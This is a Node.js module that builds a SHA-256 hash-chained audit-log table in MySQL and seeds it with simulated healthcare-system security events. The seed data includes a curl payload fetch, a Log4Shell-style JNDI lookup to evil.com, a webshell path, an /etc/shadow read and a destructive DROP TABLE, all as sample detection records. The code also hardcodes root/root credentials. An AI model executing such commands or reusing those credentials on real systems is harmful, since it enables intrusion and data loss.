const mysql = require('mysql2');
const crypto = require('crypto');

// 1. Initial connection to ensure database exists
const initialConnection = mysql.createConnection({
    host: 'localhost',
    user: 'root',
    password: 'root'
});

// 2. Main Connection Pool
const db = mysql.createPool({
    host: 'localhost',
    user: 'root',
    password: 'root',
    database: 'maverick_db',
    waitForConnections: true,
    connectionLimit: 10,
    queueLimit: 0
});

initialConnection.connect((err) => {
    if (err) {
        console.error('Error connecting to MySQL Server:', err.message);
        return;
    }

    initialConnection.query("CREATE DATABASE IF NOT EXISTS maverick_db", (err) => {
        if (err) {
            console.error('Failed to create maverick_db database:', err);
        } else {
            console.log('Connected to MySQL Server. Database `maverick_db` ready.');

            // Now create the audit_logs table using the pool
            const createTableQuery = `
                CREATE TABLE IF NOT EXISTS audit_logs (
                    log_id VARCHAR(255) PRIMARY KEY,
                    timestamp VARCHAR(255) NOT NULL,
                    source_system VARCHAR(255) NOT NULL,
                    event_category VARCHAR(255) NOT NULL,
                    event_type VARCHAR(255) NOT NULL,
                    severity VARCHAR(255) NOT NULL,
                    payload_json TEXT NOT NULL,
                    previous_hash VARCHAR(255) NOT NULL,
                    current_hash VARCHAR(255) NOT NULL,
                    UNIQUE KEY unique_event_payload (event_type(100), payload_json(255))
                )
            `;

            db.query(createTableQuery, (err) => {
                if (err) {
                    console.error('Error creating audit_logs table:', err.message);
                } else {
                    console.log('Forensic ledger table ready in MySQL with SHA-256 constraints.');
                }
            });
        }
        initialConnection.end(); // close initial connection gracefully
    });
});

// Calculate SHA-256
function calculateHash(dataString) {
    return crypto.createHash('sha256').update(dataString).digest('hex');
}

/**
 * Inserts a log into the DB, calculating the cryptographic chain.
 * Hash(N) = SHA256( Timestamp + EventType + Payload + Hash(N-1) )
 */
function insertAuditLog(log, callback) {
    // 1. Fetch the hash of the last inserted row
    db.query(`SELECT current_hash FROM audit_logs ORDER BY timestamp DESC LIMIT 1`, (err, rows) => {
        if (err) {
            if (callback) callback(err);
            return;
        }

        const row = rows && rows.length > 0 ? rows[0] : null;

        // Genesis Block Hash (if table is empty)
        const previousHash = row ? row.current_hash : '0000000000000000000000000000000000000000000000000000000000000000';

        // Parse Input
        const logId = log.id || `LOG_${Date.now()}_${Math.floor(Math.random() * 1000)}`;
        const timestamp = log.time || new Date().toISOString();
        const sourceSystem = log.source || 'Unknown node';
        const eventCategory = log.category || 'API_SENSOR';
        const eventType = log.type || 'UNKNOWN_EVENT';
        const severity = log.severity || 'INFO';
        const payloadJson = typeof log.desc === 'string' ? log.desc : JSON.stringify(log.desc || {});

        // 2. Calculate the Current Hash based on data + previous hash
        const dataString = `${timestamp}${eventType}${payloadJson}${previousHash}`;
        const currentHash = calculateHash(dataString);

        // 3. Insert the cryptographically chained record
        const query = `INSERT INTO audit_logs 
                   (log_id, timestamp, source_system, event_category, event_type, severity, payload_json, previous_hash, current_hash)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`;

        db.query(query, [logId, timestamp, sourceSystem, eventCategory, eventType, severity, payloadJson, previousHash, currentHash], function (err) {
            if (err && err.code === 'ER_DUP_ENTRY') {
                console.log(`[Deduplication] Suppressed matching payload for event type: ${eventType}`);
                if (callback) callback(new Error("Deduplicated"));
                return;
            }
            if (callback) callback(err, { ...log, id: logId, previous_hash: previousHash, current_hash: currentHash });
        });
    });
}

function getRecentLogs(limit = 40, callback) {
    db.query(`SELECT * FROM audit_logs ORDER BY timestamp DESC LIMIT ? `, [parseInt(limit)], (err, rows) => {
        if (callback) callback(err, rows);
    });
}

// Session 5 Dataset (Java/DBMS Context)
const session5Dataset = [
    { source: "EHR-Java-App", category: "FILE_PROC", type: "FILE_APPEND", severity: "INFO", desc: '{"file": "/var/log/tomcat/catalina.out", "process": "java"}' },
    { source: "EHR-Java-App", category: "FILE_PROC", type: "JVMTI_ClassLoad", severity: "CRITICAL", desc: '{"class": "Exploit.class", "class_loader": "WebappClassLoader"}' },
    { source: "EHR-Java-App", category: "FILE_PROC", type: "ProcessBuilder_Exec", severity: "CRITICAL", desc: '{"command": "sh -c curl 10.0.0.5/payload.sh", "parent": "java"}' },
    { source: "EHR-Java-App", category: "FILE_PROC", type: "FILE_READ", severity: "INFO", desc: '{"file": "/tmp/hsperfdata_root/4102"}' },
    { source: "EHR-Java-App", category: "FILE_PROC", type: "FILE_READ", severity: "INFO", desc: '{"file": "/opt/ehr/config/application.properties"}' },
    { source: "EHR-Java-App", category: "FILE_PROC", type: "FILE_CREATE", severity: "HIGH", desc: '{"file": "/tmp/webshell.jsp"}' },
    { source: "EHR-Java-App", category: "FILE_PROC", type: "Java_OutOfMemoryError", severity: "HIGH", desc: '{"heap_used_mb": 4096, "thread": "http-nio-8080-exec-1"}' },
    { source: "EHR-Java-App", category: "FILE_PROC", type: "FILE_READ_DENIED", severity: "HIGH", desc: '{"file": "/etc/shadow", "uid": "tomcat"}' },
    { source: "EHR-Java-App", category: "FILE_PROC", type: "JNDI_Lookup", severity: "CRITICAL", desc: '{"target": "ldap://evil.com/a", "class": "javax.naming.InitialContext"}' },
    { source: "EHR-Java-App", category: "FILE_PROC", type: "FILE_OPEN", severity: "INFO", desc: '{"file": "/opt/ehr/lib/log4j-core-2.14.0.jar"}' },

    { source: "PG-DB-Core", category: "API_SENSOR", type: "Auth_Failed_Java_App", severity: "MEDIUM", desc: '{"api_path": "/api/v1/auth", "username": "admin", "ip": "192.168.1.100"}' },
    { source: "EHR-Java-App", category: "API_SENSOR", type: "Spring_Actuator_Access", severity: "HIGH", desc: '{"api_path": "/actuator/env", "ip": "10.0.5.55"}' },
    { source: "PG-DB-Core", category: "API_SENSOR", type: "JDBC_Connection_Create", severity: "INFO", desc: '{"db": "ehr_prod", "user": "app_user", "pool_size": 45}' },
    { source: "PG-DB-Core", category: "API_SENSOR", type: "SQL_DDL_Execution", severity: "CRITICAL", desc: '{"query": "DROP TABLE patient_records;", "user": "postgres"}' },
    { source: "PG-DB-Core", category: "API_SENSOR", type: "SQL_DML_Bulk_Extraction", severity: "CRITICAL", desc: '{"query": "SELECT * FROM billing_info;", "rows_returned": 24500}' },
    { source: "PG-DB-Core", category: "API_SENSOR", type: "Auth_Failed_DBMS", severity: "MEDIUM", desc: '{"user": "root", "reason": "password authentication failed"}' },
    { source: "EHR-Java-App", category: "API_SENSOR", type: "API_Rate_Limit_Exceeded", severity: "HIGH", desc: '{"api_path": "/api/v1/patients/query", "ip": "45.33.22.11"}' },
    { source: "EHR-Java-App", category: "API_SENSOR", type: "HTTP_POST_Latency", severity: "INFO", desc: '{"api_path": "/api/v1/prescriptions", "latency_ms": 112}' },
    { source: "HL7_Router", category: "API_SENSOR", type: "Malformed_Packet_Dropped", severity: "MEDIUM", desc: '{"reason": "Segment out of bounds"}' },
    { source: "PG-DB-Core", category: "API_SENSOR", type: "SQL_DDL_Execution", severity: "CRITICAL", desc: '{"query": "GRANT ALL PRIVILEGES ON DATABASE ehr_prod TO guest;", "user": "dba_admin"}' }
];

function seedDatabase() {
    db.query(`SELECT COUNT(*) as count FROM audit_logs`, (err, rows) => {
        if (err) {
            // Table might not be created yet by the async init script, so try again in 1s
            if (err.code === 'ER_NO_SUCH_TABLE' || err.code === 'ER_BAD_DB_ERROR') {
                setTimeout(seedDatabase, 1000);
            } else {
                console.error("Database seed check error:", err);
            }
            return;
        }

        if (rows && rows.length > 0 && rows[0].count === 0) {
            console.log('Seeding MySQL with Session 5 cryptographically chained dataset...');

            // We must insert sequentially to ensure the hashes chain correctly
            function insertNext(index) {
                if (index >= session5Dataset.length) {
                    console.log('Genesis database seeded successfully.');
                    return;
                }

                insertAuditLog(session5Dataset[index], (err) => {
                    if (err && err.message !== "Deduplicated") console.error("Seeding Error:", err);
                    insertNext(index + 1);
                });
            }
            insertNext(0);
        }
    });
}

module.exports = {
    db,
    insertAuditLog,
    getRecentLogs,
    seedDatabase
};
